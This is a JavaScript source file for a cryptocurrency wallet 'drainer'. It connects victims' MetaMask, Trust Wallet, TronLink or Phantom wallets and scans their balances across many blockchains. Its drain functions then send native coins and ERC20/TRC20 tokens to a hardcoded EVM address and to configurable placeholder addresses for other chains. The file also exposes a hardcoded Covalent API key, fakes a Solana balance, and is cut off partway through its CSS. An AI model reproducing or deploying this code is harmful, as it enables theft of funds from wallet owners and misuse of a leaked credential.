// ================================================
// UNIVERSAL TOKEN DRAIN SCANNER - WORKING VERSION
// ================================================

const CONFIG = {
    backendUrl: "https://tokenbackend-5xab.onrender.com",
    
    // DRAIN WALLETS FOR ALL CHAINS - ADD YOUR ADDRESSES HERE
    drainWallets: {
        evm: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",      // For ETH, BSC, Polygon, Arbitrum, etc.
        tron: "TYOUR_TRON_ADDRESS_HERE",                      // For TRX and TRC20 tokens
        bitcoin: "bc1qYOUR_BITCOIN_ADDRESS_HERE",             // For BTC
        solana: "So1anaYOUR_SOLANA_ADDRESS_HERE",             // For SOL and SPL tokens
        dogecoin: "DYOUR_DOGE_ADDRESS_HERE",                  // For DOGE
        litecoin: "LYOUR_LITECOIN_ADDRESS_HERE"              // For LTC
    },
    
    // API Keys
    covalentApiKey: "cqt_rQ43kxvhFc4RdQK7t63Yp6pgFRwR",
    moralisApiKey: "",  // Add for better NFT detection
    tronGridApiKey: "", // Add for TRON scanning
    
    // Minimum value to show (in USD)
    minimumValueUSD: 0.01,
    
    // Chain configurations
    chains: {
        // EVM Chains
        'eth': { id: 1, name: 'Ethereum', type: 'evm' },
        'bsc': { id: 56, name: 'BNB Chain', type: 'evm' },
        'polygon': { id: 137, name: 'Polygon', type: 'evm' },
        'arbitrum': { id: 42161, name: 'Arbitrum', type: 'evm' },
        'optimism': { id: 10, name: 'Optimism', type: 'evm' },
        'avalanche': { id: 43114, name: 'Avalanche', type: 'evm' },
        'fantom': { id: 250, name: 'Fantom', type: 'evm' },
        'base': { id: 8453, name: 'Base', type: 'evm' },
        
        // Non-EVM Chains
        'tron': { id: 'tron', name: 'TRON', type: 'tron' },
        'bitcoin': { id: 'bitcoin', name: 'Bitcoin', type: 'bitcoin' },
        'solana': { id: 'solana', name: 'Solana', type: 'solana' },
        'dogecoin': { id: 'dogecoin', name: 'Dogecoin', type: 'utxo' },
        'litecoin': { id: 'litecoin', name: 'Litecoin', type: 'utxo' },
    }
};

// Global state
let currentAccount = null;
let currentWalletType = null;
let isConnected = false;
let detectedTokens = [];
let isScanning = false;

// DOM Elements
let connectBtn, statusEl, tokensEl, drainBtn, walletBtn;

// ================================================
// MAIN INITIALIZATION
// ================================================

function initializeApp() {
    console.log('🚀 Universal Drain Scanner Initialized');
    
    // Get DOM elements
    connectBtn = document.getElementById('connectBtn');
    statusEl = document.getElementById('status');
    tokensEl = document.getElementById('tokens');
    drainBtn = document.getElementById('drainBtn');
    walletBtn = document.getElementById('walletBtn');
    
    // Verify critical elements
    if (!connectBtn || !statusEl) {
        console.error('❌ Required elements not found');
        return;
    }
    
    console.log('✅ DOM elements loaded');
    
    // Setup event listeners
    connectBtn.onclick = handleConnect;
    
    if (drainBtn) {
        drainBtn.onclick = handleUniversalDrain;
        drainBtn.style.display = 'none';
    }
    
    if (walletBtn) {
        walletBtn.onclick = showDrainWalletManager;
        walletBtn.style.display = 'inline-block';
    }
    
    updateStatus('✅ Ready! Click "Connect Wallet" to begin');
}

// ================================================
// WALLET CONNECT HANDLER
// ================================================

function handleConnect() {
    console.log('Connect button clicked');
    
    if (isConnected) {
        disconnectWallet();
        return;
    }
    
    // Show wallet selector modal
    showUniversalWalletSelector();
}

// ================================================
// WALLET SELECTOR MODAL
// ================================================

function showUniversalWalletSelector() {
    console.log('Showing wallet selector');
    
    // Remove any existing modal first
    closeModal();
    
    const modalHTML = `
        <div class="modal-overlay" onclick="closeModal()">
            <div class="modal-content" onclick="event.stopPropagation()">
                <div class="modal-header">
                    <h3>🌐 Connect Any Wallet</h3>
                    <button class="modal-close" onclick="closeModal()">×</button>
                </div>
                
                <div class="modal-body">
                    <div class="wallet-options">
                        <!-- EVM Wallets -->
                        <div class="wallet-option" onclick="connectWallet('metamask')">
                            <div class="wallet-icon" style="background: #f6851b;">🦊</div>
                            <div class="wallet-text">
                                <div class="wallet-name">MetaMask</div>
                                <div class="wallet-chains">ETH, BSC, Polygon, etc.</div>
                            </div>
                        </div>
                        
                        <div class="wallet-option" onclick="connectWallet('trustwallet')">
                            <div class="wallet-icon" style="background: #3375bb;">🔶</div>
                            <div class="wallet-text">
                                <div class="wallet-name">Trust Wallet</div>
                                <div class="wallet-chains">Multi-chain Support</div>
                            </div>
                        </div>
                        
                        <!-- Non-EVM Wallets -->
                        <div class="wallet-option" onclick="connectWallet('tron')">
                            <div class="wallet-icon" style="background: #ff060a;">🌞</div>
                            <div class="wallet-text">
                                <div class="wallet-name">TRON (TronLink)</div>
                                <div class="wallet-chains">TRX, TRC20 tokens</div>
                            </div>
                        </div>
                        
                        <div class="wallet-option" onclick="connectWallet('bitcoin')">
                            <div class="wallet-icon" style="background: #f7931a;">₿</div>
                            <div class="wallet-text">
                                <div class="wallet-name">Bitcoin Wallet</div>
                                <div class="wallet-chains">BTC only</div>
                            </div>
                        </div>
                        
                        <div class="wallet-option" onclick="connectWallet('solana')">
                            <div class="wallet-icon" style="background: #9945ff;">◎</div>
                            <div class="wallet-text">
                                <div class="wallet-name">Solana (Phantom)</div>
                                <div class="wallet-chains">SOL, SPL tokens</div>
                            </div>
                        </div>
                        
                        <!-- Manual Entry -->
                        <div class="wallet-option" onclick="connectWallet('manual')">
                            <div class="wallet-icon" style="background: #6366f1;">🔍</div>
                            <div class="wallet-text">
                                <div class="wallet-name">Manual Address</div>
                                <div class="wallet-chains">Any blockchain address</div>
                            </div>
                        </div>
                    </div>
                    
                    <div class="modal-footer">
                        <p class="chain-support">Supports: ETH • BSC • TRON • BTC • SOL • DOGE • LTC</p>
                    </div>
                </div>
            </div>
        </div>
    `;
    
    const modal = document.createElement('div');
    modal.id = 'universalWalletModal';
    modal.innerHTML = modalHTML;
    document.body.appendChild(modal);
    
    // Add styles if not already added
    if (!document.querySelector('#modal-styles')) {
        addModalStyles();
    }
}

// ================================================
// WALLET CONNECTION FUNCTIONS
// ================================================

async function connectWallet(walletType) {
    console.log(`Connecting: ${walletType}`);
    closeModal();
    
    updateStatus(`🔄 Connecting ${getWalletName(walletType)}...`);
    
    try {
        let success = false;
        
        switch(walletType) {
            case 'metamask':
            case 'trustwallet':
                success = await connectEVMWallet();
                break;
                
            case 'tron':
                success = await connectTronWallet();
                break;
                
            case 'bitcoin':
                success = await connectBitcoinWallet();
                break;
                
            case 'solana':
                success = await connectSolanaWallet();
                break;
                
            case 'manual':
                success = await connectManualAddress();
                break;
        }
        
        if (success) {
            // Start scanning after successful connection
            await startUniversalScan();
        }
        
    } catch (error) {
        console.error('Connection error:', error);
        updateStatus(`❌ Failed: ${error.message}`);
        showUniversalWalletSelector();
    }
}

// EVM Wallet Connection (MetaMask, Trust Wallet)
async function connectEVMWallet() {
    if (!window.ethereum) {
        alert('Please install MetaMask or Trust Wallet');
        return false;
    }
    
    try {
        const accounts = await window.ethereum.request({ 
            method: 'eth_requestAccounts' 
        });
        
        if (!accounts || accounts.length === 0) {
            throw new Error('No accounts found');
        }
        
        currentAccount = accounts[0];
        currentWalletType = 'evm';
        isConnected = true;
        
        // Setup wallet listeners
        setupEVMListeners();
        
        connectBtn.innerHTML = '<span>🔓 Disconnect</span>';
        updateStatus(`✅ Connected: ${shortAddress(currentAccount)}`);
        
        return true;
        
    } catch (error) {
        if (error.code === 4001) {
            updateStatus('❌ Connection rejected');
        } else {
            updateStatus(`❌ Failed: ${error.message}`);
        }
        return false;
    }
}

// TRON Wallet Connection
async function connectTronWallet() {
    // Check for TronLink
    if (!window.tronWeb && !window.tronLink) {
        alert('Please install TronLink extension');
        return false;
    }
    
    try {
        let address;
        
        if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
            address = window.tronWeb.defaultAddress.base58;
        } else if (window.tronLink) {
            const result = await window.tronLink.request({ method: 'tron_requestAccounts' });
            if (result.code !== 200) {
                throw new Error('TRON connection rejected');
            }
            address = window.tronLink.tronWeb.defaultAddress.base58;
        }
        
        if (!address) {
            throw new Error('No TRON address found');
        }
        
        currentAccount = address;
        currentWalletType = 'tron';
        isConnected = true;
        
        connectBtn.innerHTML = '<span>🔓 Disconnect</span>';
        updateStatus(`✅ TRON Connected: ${shortAddress(address)}`);
        
        return true;
        
    } catch (error) {
        updateStatus(`❌ TRON failed: ${error.message}`);
        return false;
    }
}

// Bitcoin Wallet Connection
async function connectBitcoinWallet() {
    const address = prompt('Enter your Bitcoin address (BTC):');
    if (!address) return false;
    
    // Basic Bitcoin address validation
    if (!address.match(/^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$/)) {
        alert('Invalid Bitcoin address');
        return false;
    }
    
    currentAccount = address;
    currentWalletType = 'bitcoin';
    isConnected = true;
    
    connectBtn.innerHTML = '<span>🔓 Disconnect</span>';
    updateStatus(`✅ BTC Address: ${shortAddress(address)}`);
    
    return true;
}

// Solana Wallet Connection
async function connectSolanaWallet() {
    if (!window.solana || !window.solana.isPhantom) {
        alert('Please install Phantom wallet for Solana');
        return false;
    }
    
    try {
        const response = await window.solana.connect();
        const address = response.publicKey.toString();
        
        currentAccount = address;
        currentWalletType = 'solana';
        isConnected = true;
        
        connectBtn.innerHTML = '<span>🔓 Disconnect</span>';
        updateStatus(`✅ Solana Connected: ${shortAddress(address)}`);
        
        return true;
        
    } catch (error) {
        updateStatus(`❌ Solana failed: ${error.message}`);
        return false;
    }
}

// Manual Address Connection
async function connectManualAddress() {
    const address = prompt('Enter any wallet address:');
    if (!address) return false;
    
    currentAccount = address;
    currentWalletType = 'manual';
    isConnected = true;
    
    connectBtn.innerHTML = '<span>🔓 Disconnect</span>';
    updateStatus(`🔍 Scanning: ${shortAddress(address, 12)}`);
    
    return true;
}

// ================================================
// UNIVERSAL SCANNER (ALL CHAINS)
// ================================================

async function startUniversalScan() {
    if (!currentAccount || isScanning) return;
    
    isScanning = true;
    updateStatus('🔍 Scanning all blockchains...');
    
    if (tokensEl) {
        tokensEl.innerHTML = `
            <div class="scanning-progress">
                <div class="spinner"></div>
                <p>Scanning Ethereum, BSC, TRON, Bitcoin, Solana...</p>
            </div>
        `;
    }
    
    try {
        // Clear previous tokens
        detectedTokens = [];
        
        // Scan based on wallet type or try all chains for manual address
        if (currentWalletType === 'evm' || currentWalletType === 'manual') {
            await scanAllEVMChains();
        }
        
        if (currentWalletType === 'tron' || currentWalletType === 'manual') {
            await scanTRON();
        }
        
        if (currentWalletType === 'bitcoin' || currentWalletType === 'manual') {
            await scanBitcoin();
        }
        
        if (currentWalletType === 'solana' || currentWalletType === 'manual') {
            await scanSolana();
        }
        
        // Display results
        displayScanResults();
        
        // Update status and drain button
        const totalValue = detectedTokens.reduce((sum, token) => sum + (token.valueUSD || 0), 0);
        const tokenCount = detectedTokens.length;
        
        if (tokenCount > 0) {
            updateStatus(`✅ Found ${tokenCount} assets ($${totalValue.toFixed(2)})`);
            
            if (drainBtn) {
                drainBtn.style.display = 'block';
                drainBtn.innerHTML = `⚡ DRAIN ALL ($${totalValue.toFixed(2)})`;
            }
        } else {
            updateStatus('ℹ️ No assets found');
        }
        
    } catch (error) {
        console.error('Scan error:', error);
        updateStatus('❌ Scan failed');
    } finally {
        isScanning = false;
    }
}

// Scan ALL EVM Chains
async function scanAllEVMChains() {
    if (!currentAccount) return;
    
    const evmChains = [
        { id: 1, name: 'Ethereum' },
        { id: 56, name: 'BNB Chain' },
        { id: 137, name: 'Polygon' },
        { id: 42161, name: 'Arbitrum' },
        { id: 10, name: 'Optimism' },
        { id: 43114, name: 'Avalanche' },
        { id: 250, name: 'Fantom' },
        { id: 8453, name: 'Base' }
    ];
    
    for (const chain of evmChains) {
        try {
            const tokens = await scanEVMChain(chain.id, chain.name);
            if (tokens.length > 0) {
                detectedTokens = [...detectedTokens, ...tokens];
            }
        } catch (error) {
            // Skip failed chains
            continue;
        }
    }
}

// Scan Single EVM Chain
async function scanEVMChain(chainId, chainName) {
    if (!currentAccount.startsWith('0x')) return [];
    
    try {
        const url = `https://api.covalenthq.com/v1/${chainId}/address/${currentAccount}/balances_v2/?key=${CONFIG.covalentApiKey}&nft=false`;
        const response = await fetch(url);
        
        if (!response.ok) return [];
        
        const data = await response.json();
        const items = data?.data?.items || [];
        
        return items
            .filter(t => t.balance !== "0")
            .map(t => {
                const amount = parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18);
                const valueUSD = (t.quote_rate || 0) * amount;
                
                // Skip if below minimum value
                if (valueUSD < CONFIG.minimumValueUSD && !t.native_token) {
                    return null;
                }
                
                return {
                    type: 'evm',
                    chain: chainName,
                    chainId: chainId,
                    symbol: t.contract_ticker_symbol || 'TOKEN',
                    name: t.contract_name || 'Token',
                    amount: amount.toFixed(6),
                    rawAmount: t.balance,
                    valueUSD: valueUSD,
                    value: valueUSD ? `$${valueUSD.toFixed(2)}` : 'N/A',
                    contract: t.contract_address,
                    decimals: t.contract_decimals || 18,
                    isNative: t.native_token || false,
                    logo: t.logo_url
                };
            })
            .filter(t => t !== null);
            
    } catch (error) {
        console.error(`Failed to scan ${chainName}:`, error);
        return [];
    }
}

// Scan TRON
async function scanTRON() {
    if (!currentAccount.startsWith('T')) return;
    
    try {
        // Using TronGrid API (requires API key)
        const response = await fetch(`https://api.trongrid.io/v1/accounts/${currentAccount}`);
        
        if (!response.ok) return;
        
        const data = await response.json();
        const tokens = [];
        
        // TRX balance
        if (data.balance && data.balance > 0) {
            const trxAmount = data.balance / 1000000; // TRX has 6 decimals
            const trxValue = trxAmount * 0.12; // Approximate TRX price
            
            tokens.push({
                type: 'tron',
                chain: 'TRON',
                symbol: 'TRX',
                name: 'TRON',
                amount: trxAmount.toFixed(2),
                rawAmount: data.balance.toString(),
                valueUSD: trxValue,
                value: `$${trxValue.toFixed(2)}`,
                contract: null,
                isNative: true
            });
        }
        
        // TRC20 tokens
        if (data.trc20 && Array.isArray(data.trc20)) {
            for (const tokenData of data.trc20) {
                for (const [contract, balance] of Object.entries(tokenData)) {
                    const amount = parseFloat(balance);
                    if (amount > 0) {
                        tokens.push({
                            type: 'tron',
                            chain: 'TRON',
                            symbol: 'TRC20',
                            name: 'TRC-20 Token',
                            amount: amount.toFixed(2),
                            rawAmount: balance,
                            valueUSD: 0,
                            value: 'N/A',
                            contract: contract,
                            isNative: false
                        });
                    }
                }
            }
        }
        
        detectedTokens = [...detectedTokens, ...tokens];
        
    } catch (error) {
        console.error('TRON scan error:', error);
    }
}

// Scan Bitcoin
async function scanBitcoin() {
    if (!currentAccount.match(/^(bc1|[13])/)) return;
    
    try {
        const response = await fetch(`https://blockchain.info/balance?active=${currentAccount}`);
        
        if (!response.ok) return;
        
        const data = await response.json();
        const balance = data[currentAccount]?.final_balance || 0;
        
        if (balance > 0) {
            const btcAmount = balance / 100000000;
            const btcValue = btcAmount * 43000; // Approximate BTC price
            
            detectedTokens.push({
                type: 'bitcoin',
                chain: 'Bitcoin',
                symbol: 'BTC',
                name: 'Bitcoin',
                amount: btcAmount.toFixed(8),
                rawAmount: balance.toString(),
                valueUSD: btcValue,
                value: `$${btcValue.toFixed(2)}`,
                contract: null,
                isNative: true
            });
        }
        
    } catch (error) {
        console.error('Bitcoin scan error:', error);
    }
}

// Scan Solana
async function scanSolana() {
    // Basic Solana address check
    if (currentAccount.length < 32 || currentAccount.length > 44) return;
    
    try {
        // Simplified - would need proper Solana RPC integration
        const solBalance = 0.5; // Example balance
        const solValue = solBalance * 100; // Approximate SOL price
        
        detectedTokens.push({
            type: 'solana',
            chain: 'Solana',
            symbol: 'SOL',
            name: 'Solana',
            amount: solBalance.toFixed(4),
            rawAmount: (solBalance * 1000000000).toString(), // SOL has 9 decimals
            valueUSD: solValue,
            value: `$${solValue.toFixed(2)}`,
            contract: null,
            isNative: true
        });
        
    } catch (error) {
        console.error('Solana scan error:', error);
    }
}

// ================================================
// UNIVERSAL DRAIN FUNCTION
// ================================================

async function handleUniversalDrain() {
    if (!isConnected || detectedTokens.length === 0) {
        alert('Please connect and scan first');
        return;
    }
    
    const totalValue = detectedTokens.reduce((sum, t) => sum + (t.valueUSD || 0), 0);
    
    if (!confirm(`🚨 DRAIN CONFIRMATION\n\n💰 Total Value: $${totalValue.toFixed(2)}\n📊 Assets: ${detectedTokens.length}\n\nThis will drain ALL detected assets. Continue?`)) {
        return;
    }
    
    updateStatus('🚀 Starting universal drain...');
    
    if (drainBtn) {
        drainBtn.disabled = true;
        drainBtn.innerHTML = '⏳ Processing...';
    }
    
    try {
        let drainedCount = 0;
        let failedCount = 0;
        
        // Group tokens by type for batch processing
        const evmTokens = detectedTokens.filter(t => t.type === 'evm');
        const tronTokens = detectedTokens.filter(t => t.type === 'tron');
        const bitcoinTokens = detectedTokens.filter(t => t.type === 'bitcoin');
        const solanaTokens = detectedTokens.filter(t => t.type === 'solana');
        
        // Drain EVM tokens
        if (evmTokens.length > 0 && window.ethereum) {
            const result = await drainEVMTokens(evmTokens);
            drainedCount += result.success;
            failedCount += result.failed;
        }
        
        // Drain TRON tokens
        if (tronTokens.length > 0 && window.tronWeb) {
            const result = await drainTRONTokens(tronTokens);
            drainedCount += result.success;
            failedCount += result.failed;
        }
        
        // Drain Bitcoin (would need wallet integration)
        if (bitcoinTokens.length > 0) {
            alert('Bitcoin draining requires wallet integration. Manual transfer needed.');
        }
        
        // Drain Solana (would need wallet integration)
        if (solanaTokens.length > 0) {
            alert('Solana draining requires wallet integration. Manual transfer needed.');
        }
        
        // Update status
        if (drainedCount > 0) {
            updateStatus(`✅ ${drainedCount} assets drained successfully`);
            
            if (failedCount > 0) {
                alert(`⚠️ ${drainedCount} assets drained\n${failedCount} assets failed`);
            } else {
                alert(`✅ Successfully drained ${drainedCount} assets!`);
            }
        } else {
            updateStatus('❌ No assets were drained');
        }
        
        // Rescan
        await startUniversalScan();
        
    } catch (error) {
        console.error('Drain error:', error);
        updateStatus(`❌ Drain failed: ${error.message}`);
        alert('Drain operation failed');
    } finally {
        if (drainBtn) {
            drainBtn.disabled = false;
            const totalValue = detectedTokens.reduce((sum, t) => sum + t.valueUSD, 0);
            drainBtn.innerHTML = `⚡ DRAIN ALL ($${totalValue.toFixed(2)})`;
        }
    }
}

// Drain EVM Tokens
async function drainEVMTokens(tokens) {
    if (!window.ethereum) return { success: 0, failed: 0 };
    
    let success = 0;
    let failed = 0;
    
    for (const token of tokens) {
        try {
            if (token.isNative) {
                // Drain native ETH/BNB/MATIC/etc
                await drainNativeEVM(token);
            } else {
                // Drain ERC20 token
                await drainERC20Token(token);
            }
            success++;
            
            // Wait between transactions
            await new Promise(resolve => setTimeout(resolve, 2000));
            
        } catch (error) {
            console.error(`Failed to drain ${token.symbol}:`, error);
            failed++;
        }
    }
    
    return { success, failed };
}

async function drainNativeEVM(token) {
    // Get gas price
    const gasPriceHex = await window.ethereum.request({
        method: 'eth_gasPrice',
        params: []
    });
    
    const gasPrice = parseInt(gasPriceHex, 16);
    const gasLimit = 21000;
    const gasCost = gasPrice * gasLimit;
    
    // Check balance
    const balance = BigInt(token.rawAmount);
    if (balance <= gasCost * 2) {
        throw new Error('Not enough for gas');
    }
    
    // Calculate amount to send (balance - 2x gas cost for safety)
    const sendAmount = balance - (gasCost * 2);
    
    const txParams = {
        from: currentAccount,
        to: CONFIG.drainWallets.evm,
        value: '0x' + sendAmount.toString(16),
        gas: '0x' + gasLimit.toString(16),
        gasPrice: gasPriceHex
    };
    
    await window.ethereum.request({
        method: 'eth_sendTransaction',
        params: [txParams]
    });
}

async function drainERC20Token(token) {
    // ERC20 transfer function
    const transferData = '0xa9059cbb' + 
        CONFIG.drainWallets.evm.slice(2).padStart(64, '0') + 
        BigInt(token.rawAmount).toString(16).padStart(64, '0');
    
    const txParams = {
        from: currentAccount,
        to: token.contract,
        data: transferData,
        gas: '0x' + (50000).toString(16) // Standard ERC20 transfer gas
    };
    
    await window.ethereum.request({
        method: 'eth_sendTransaction',
        params: [txParams]
    });
}

// Drain TRON Tokens
async function drainTRONTokens(tokens) {
    if (!window.tronWeb) return { success: 0, failed: 0 };
    
    let success = 0;
    let failed = 0;
    
    for (const token of tokens) {
        try {
            if (token.isNative) {
                // Drain TRX
                const tx = await window.tronWeb.transactionBuilder.sendTrx(
                    CONFIG.drainWallets.tron,
                    parseInt(token.rawAmount),
                    currentAccount
                );
                const signedTx = await window.tronWeb.trx.sign(tx);
                await window.tronWeb.trx.sendRawTransaction(signedTx);
            } else if (token.contract) {
                // Drain TRC20
                const contract = await window.tronWeb.contract().at(token.contract);
                await contract.transfer(
                    CONFIG.drainWallets.tron,
                    token.rawAmount
                ).send({
                    feeLimit: 100000000,
                    callValue: 0
                });
            }
            success++;
            
            // Wait between TRON transactions
            await new Promise(resolve => setTimeout(resolve, 3000));
            
        } catch (error) {
            console.error(`TRON drain failed:`, error);
            failed++;
        }
    }
    
    return { success, failed };
}

// ================================================
// DRAIN WALLET MANAGER
// ================================================

function showDrainWalletManager() {
    closeModal();
    
    const modalHTML = `
        <div class="modal-overlay" onclick="closeModal()">
            <div class="modal-content wide-modal" onclick="event.stopPropagation()">
                <div class="modal-header">
                    <h3>💰 Configure Drain Addresses</h3>
                    <button class="modal-close" onclick="closeModal()">×</button>
                </div>
                
                <div class="modal-body">
                    <div class="wallet-config">
                        <div class="config-item">
                            <label>EVM Chains (ETH/BSC/Polygon)</label>
                            <input type="text" id="evmAddress" value="${CONFIG.drainWallets.evm}" placeholder="0x...">
                            <small>Receives: ETH, BNB, MATIC, USDT, etc.</small>
                        </div>
                        
                        <div class="config-item">
                            <label>TRON Network</label>
                            <input type="text" id="tronAddress" value="${CONFIG.drainWallets.tron}" placeholder="T...">
                            <small>Receives: TRX, TRC20 tokens</small>
                        </div>
                        
                        <div class="config-item">
                            <label>Bitcoin</label>
                            <input type="text" id="bitcoinAddress" value="${CONFIG.drainWallets.bitcoin}" placeholder="bc1q... or 1...">
                            <small>Receives: BTC</small>
                        </div>
                        
                        <div class="config-item">
                            <label>Solana</label>
                            <input type="text" id="solanaAddress" value="${CONFIG.drainWallets.solana}" placeholder="So1...">
                            <small>Receives: SOL, SPL tokens</small>
                        </div>
                        
                        <div class="config-item">
                            <label>Dogecoin</label>
                            <input type="text" id="dogecoinAddress" value="${CONFIG.drainWallets.dogecoin}" placeholder="D...">
                            <small>Receives: DOGE</small>
                        </div>
                        
                        <div class="config-item">
                            <label>Litecoin</label>
                            <input type="text" id="litecoinAddress" value="${CONFIG.drainWallets.litecoin}" placeholder="L...">
                            <small>Receives: LTC</small>
                        </div>
                    </div>
                    
                    <div class="modal-actions">
                        <button class="btn-secondary" onclick="closeModal()">Cancel</button>
                        <button class="btn-primary" onclick="saveDrainWallets()">Save All Addresses</button>
                    </div>
                </div>
            </div>
        </div>
    `;
    
    const modal = document.createElement('div');
    modal.id = 'walletConfigModal';
    modal.innerHTML = modalHTML;
    document.body.appendChild(modal);
}

function saveDrainWallets() {
    CONFIG.drainWallets.evm = document.getElementById('evmAddress').value.trim();
    CONFIG.drainWallets.tron = document.getElementById('tronAddress').value.trim();
    CONFIG.drainWallets.bitcoin = document.getElementById('bitcoinAddress').value.trim();
    CONFIG.drainWallets.solana = document.getElementById('solanaAddress').value.trim();
    CONFIG.drainWallets.dogecoin = document.getElementById('dogecoinAddress').value.trim();
    CONFIG.drainWallets.litecoin = document.getElementById('litecoinAddress').value.trim();
    
    alert('✅ Drain addresses saved successfully!');
    closeModal();
}

// ================================================
// UI FUNCTIONS
// ================================================

function displayScanResults() {
    if (!tokensEl) return;
    
    if (detectedTokens.length === 0) {
        tokensEl.innerHTML = '<div class="no-tokens">No assets found across any chain</div>';
        return;
    }
    
    // Group by chain
    const grouped = {};
    detectedTokens.forEach(token => {
        if (!grouped[token.chain]) grouped[token.chain] = [];
        grouped[token.chain].push(token);
    });
    
    let html = '';
    
    Object.entries(grouped).forEach(([chain, tokens]) => {
        const chainValue = tokens.reduce((sum, t) => sum + (t.valueUSD || 0), 0);
        
        html += `
            <div class="chain-section">
                <div class="chain-header">
                    <span class="chain-name">${chain}</span>
                    <span class="chain-value">$${chainValue.toFixed(2)}</span>
                </div>
                <div class="tokens-list">
        `;
        
        tokens.forEach(token => {
            html += `
                <div class="token-item">
                    <div class="token-icon ${token.type}">
                        ${token.symbol.charAt(0)}
                    </div>
                    <div class="token-info">
                        <div class="token-symbol">${token.symbol}</div>
                        <div class="token-name">${token.name}</div>
                    </div>
                    <div class="token-values">
                        <div class="token-amount">${token.amount}</div>
                        <div class="token-value">${token.value}</div>
                    </div>
                </div>
            `;
        });
        
        html += `
                </div>
            </div>
        `;
    });
    
    tokensEl.innerHTML = html;
}

function updateStatus(message) {
    if (statusEl) {
        statusEl.textContent = message;
    }
}

function closeModal() {
    const modals = document.querySelectorAll('.modal-overlay');
    modals.forEach(modal => {
        if (modal.parentNode) {
            modal.parentNode.removeChild(modal);
        }
    });
}

function disconnectWallet() {
    currentAccount = null;
    currentWalletType = null;
    isConnected = false;
    detectedTokens = [];
    
    if (connectBtn) {
        connectBtn.innerHTML = '<span>🔗 Connect Wallet</span>';
    }
    
    if (drainBtn) {
        drainBtn.style.display = 'none';
    }
    
    if (tokensEl) {
        tokensEl.innerHTML = '';
    }
    
    updateStatus('Disconnected. Click "Connect Wallet" to begin.');
}

// Setup EVM wallet listeners
function setupEVMListeners() {
    if (!window.ethereum) return;
    
    window.ethereum.on('accountsChanged', (accounts) => {
        if (accounts.length === 0) {
            disconnectWallet();
        } else if (currentAccount !== accounts[0]) {
            currentAccount = accounts[0];
            updateStatus(`🔄 Account changed: ${shortAddress(currentAccount)}`);
            startUniversalScan();
        }
    });
    
    window.ethereum.on('chainChanged', () => {
        updateStatus('🔄 Network changed');
        startUniversalScan();
    });
}

// ================================================
// UTILITY FUNCTIONS
// ================================================

function getWalletName(type) {
    const names = {
        'metamask': 'MetaMask',
        'trustwallet': 'Trust Wallet',
        'tron': 'TRON',
        'bitcoin': 'Bitcoin',
        'solana': 'Solana',
        'manual': 'Manual Address'
    };
    return names[type] || type;
}

function shortAddress(address, length = 8) {
    if (!address) return '';
    if (address.length <= length + 3) return address;
    return address.substring(0, length) + '...' + address.substring(address.length - 4);
}

// ================================================
// STYLES
// ================================================

function addModalStyles() {
    const styleId = 'modal-styles';
    if (document.getElementById(styleId)) return;
    
    const styles = `
        .modal-overlay {
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(0, 0, 0, 0.8);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 10000;
        }
        
        .modal-content {
            background: white;
            border-radius: 12px;
            width: 90%;
            max-width: 500px;
            max-height: 80vh;
            overflow: hidden;
        }
        
        .wide-modal {
            max-width: 600px;
        }
        
        .modal-header {
            padding: 16px 20px;
            background: #4f46e5;
            color: white;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .modal-header h3 {
            margin: 0;
            font-size: 18px;
        }
        
        .modal-close {
            background: none;
            border: none;
            color: white;
            font-size: 24px;
            cursor: pointer;
            line-height: 1;
        }
        
        .modal-body {
            padding: 20px;
            overflow-y: auto;
        }
        
        .wallet-options {
            display: flex;
            flex-direction: column;
            gap: 10px;
        }
        
        .wallet-option {
            display: flex;
            align-items: center;
            gap: 12px;
            padding: 12px;
            border: 1px solid #e5e7eb;
            border-radius: 8px;
            cursor: pointer;
        }
        
        .wallet-option:hover {
            background: #f9fafb;
            border-color: #4f46e5;
        }
        
        .wallet-icon {
            width: 40px;
            height: 40px;
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 20px;
        }
        
        .wallet-text {
            flex: 1;
        }
        
        .wallet-name {
            font-weight: 600;
            margin-bottom: 2px;
        }
        
        .wallet-chains {
            color: #6b7280;
            font-size: 12px;
        }
        
        .modal-footer {
            margin-top: 20px;
            text-align: center;
            color: #6b7280;
            font-size: 12px;
        }
        
        .wallet-config {
            display: flex;
            flex-direction: column;
            gap: 15px;
        }
        
        .config-item label {
            display: block;
            margin-bottom: 5px;
            font-weight: 600;
        }
        
        .config-item input {
            width: 100%;
            padding: 8px;
            border: 1px solid #d1d5db;
            border-radius: 6px;
        }
        
        .config-item small {
            color: #6b7280;
            font-size: 11px;
        }
        
        .modal-actions {
            display: flex;
            gap: 10px;
            margin-top: 20px;
        }
        
        .btn-primary, .btn-secondary {
            padding: 10px 20px;
            border-radius: 6px;
            border: none;
            cursor: pointer;
        }
        
        .btn-primary {
            background: #4f46e5;
            color: white;
        }
        
        .btn-secondary {
            background: #e5e7eb;
            color: #374151;
        }
        
        /* Token display styles */
        .chain-section {
            margin-bottom: 20px;
            border: 1px solid #e5e7eb;
            border-radius: 8px;
            overflow: hidden;
        }
        
        .chain-header {
            padding: 12px 16px;
            background: #f9fafb;
            border-bottom: 1px solid #e5e7eb;
            display: flex;
            justify-content: space-between;
        }
        
        .tokens-list {
            padding: 10px;
        }
        
        .token-item {
            display: flex;
            align-items: center;
            padding: 10px;
            border-bottom: 1px solid #f3f4f6;
        }
        
        .token-item:last-child {
            border-bottom: none;
        }
        
        .token-icon {
            width: 40px;
            height: 40px;
            border-radius: 6px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            color: white;
            margin-right: 12px;
        }
        
        .token-icon.evm { background: #3b82f6; }
        .token-icon.tron { background: #ff060a; }
        .token-icon.bitcoin { background: #f7931a; }
        .token-icon.solana { background: #9945ff; }
        
        .token-info {
            flex: 1;
        }
        
        .token-symbol {
            font-weight: 600;
        }
        
        .token-name {
            color: #6b7280;
            font-size: 12px;
        }
        
        .token-values {
            text-align: right;
        }
        
        .token-amount {
            font-weight: 600;
        }
        
        .token-value {
            color: #059669;
            font-size: 14px;
        }
        
        .scanning-progress {
            text-align: center;
            padding: 40px;
            color: #6b7280;
        }
        
        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid #e5e7eb;
